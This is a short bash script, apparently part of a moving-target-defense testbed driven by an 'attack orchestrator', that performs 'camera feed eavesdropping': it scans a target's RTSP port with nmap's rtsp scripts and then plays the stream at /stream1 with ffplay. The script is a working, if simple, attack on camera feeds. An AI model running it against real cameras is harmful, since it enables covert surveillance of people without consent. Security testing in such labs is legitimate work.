#!/usr/bin/env bash
set -euo pipefail

# Camera feed eavesdropping (RTSP, MTD-aware)

# MTD_INTERFACE_START
if [[ -z "${TARGET_IP:-}" ]]; then
    echo "ERROR: TARGET_IP is not set." >&2
    echo "Run via attack_orchestrator.py so MTD state can resolve the target." >&2
    exit 1
fi

case "${TARGET_SERVICE:-CAMERA_RTSP}" in
  CAMERA_RTSP)
    TARGET_PORT="${TARGET_PORT:-554}"
    ;;
  *)
    TARGET_PORT="${TARGET_PORT:-554}"
    ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-CAMERA_RTSP})"
# MTD_INTERFACE_END

export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=camera-feed-eavesdropping src=Camera-Feed-Eavesdropping.md"

log "[BLOCK 1] type=shell (RTSP scan via nmap)"
nmap -Pn -p "${TARGET_PORT}" "${TARGET_IP}" --script rtsp*

log "[BLOCK 2] type=shell (RTSP playback via ffplay)"
ffplay "rtsp://${TARGET_IP}:${TARGET_PORT}/stream1"
